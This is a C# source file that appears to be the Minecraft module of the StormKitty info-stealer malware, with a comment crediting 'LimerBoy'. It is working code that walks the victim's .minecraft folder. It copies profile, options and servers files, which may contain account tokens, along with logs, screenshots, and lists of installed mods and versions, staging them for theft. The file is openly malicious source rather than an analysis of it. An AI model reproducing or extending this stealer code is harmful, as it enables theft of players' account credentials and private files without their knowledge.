using StormKitty;
using System;
using System.IO;

namespace Stealer // This shit coded by LimerBoy
{
    internal sealed class Minecraft
    {
        private static string MinecraftPath = Path.Combine(Paths.appdata, ".minecraft");

        // Get installed versions
        private static void SaveVersions(string sSavePath)
        {
            try
            {
                foreach (string version in Directory.GetDirectories(Path.Combine(MinecraftPath, "versions")))
                {
                    string name = new DirectoryInfo(version).Name;
                    string size = Filemanager.DirectorySize(version) + " bytes";
                    string date = Directory.GetCreationTime(version)
                        .ToString("yyyy-MM-dd h:mm:ss tt");

                    File.AppendAllText(sSavePath + "\\versions.txt", $"VERSION: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
                }
            }
            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect installed versions\n" + ex); }
        }

        // Get installed mods
        private static void SaveMods(string sSavePath)
        {
            try
            {
                foreach (string mod in Directory.GetFiles(Path.Combine(MinecraftPath, "mods")))
                {
                    string name = Path.GetFileName(mod);
                    string size = new FileInfo(mod).Length + " bytes";
                    string date = File.GetCreationTime(mod)
                        .ToString("yyyy-MM-dd h:mm:ss tt");

                    File.AppendAllText(sSavePath + "\\mods.txt", $"MOD: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
                }
            }
            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect installed mods\n" + ex); }
        }

        // Get screenshots
        private static void SaveScreenshots(string sSavePath)
        {
            try
            {
                string[] screenshots = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
                if (screenshots.Length == 0) return;

                Directory.CreateDirectory(sSavePath + "\\screenshots");
                foreach (string screenshot in screenshots)
                    File.Copy(screenshot, sSavePath + "\\screenshots\\" + Path.GetFileName(screenshot));
            }
            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect screenshots\n" + ex); }
        }

        // Get profile & options & servers files 
        private static void SaveFiles(string sSavePath)
        {
            try
            {
                string[] files = Directory.GetFiles(MinecraftPath);
                foreach (string file in files)
                {
                    FileInfo File = new FileInfo(file);
                    string SFile = File.Name.ToLower();
                    if (SFile.Contains("profile") || SFile.Contains("options") || SFile.Contains("servers"))
                        File.CopyTo(Path.Combine(sSavePath, File.Name));
                }
            }
            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect profiles\n" + ex); }
        }

        // Get logs
        private static void SaveLogs(string sSavePath)
        {
            try
            {
                string logdir = Path.Combine(MinecraftPath, "logs");
                string savedir = Path.Combine(sSavePath, "logs");
                if (!Directory.Exists(logdir)) return;
                Directory.CreateDirectory(savedir);
                string[] files = Directory.GetFiles(logdir);
                foreach (string file in files)
                {
                    FileInfo File = new FileInfo(file);
                    if (File.Length < Config.GrabberSizeLimit)
                    {
                        string to = Path.Combine(savedir, File.Name);
                        if (!System.IO.File.Exists(to))
                            File.CopyTo(to);
                    }
                }
            }
            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect logs\n" + ex); }
        }

        // Run minecraft data stealer
        public static void SaveAll(string sSavePath)
        {
            if (!Directory.Exists(MinecraftPath)) return;

            try
            {
                Directory.CreateDirectory(sSavePath);
                SaveMods(sSavePath);
                SaveFiles(sSavePath);
                SaveVersions(sSavePath);
                if (Config.GrabberModule == "1")
                {
                    SaveLogs(sSavePath);
                    SaveScreenshots(sSavePath);
                }
            }
            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect data\n" + ex); }
        }


    }
}
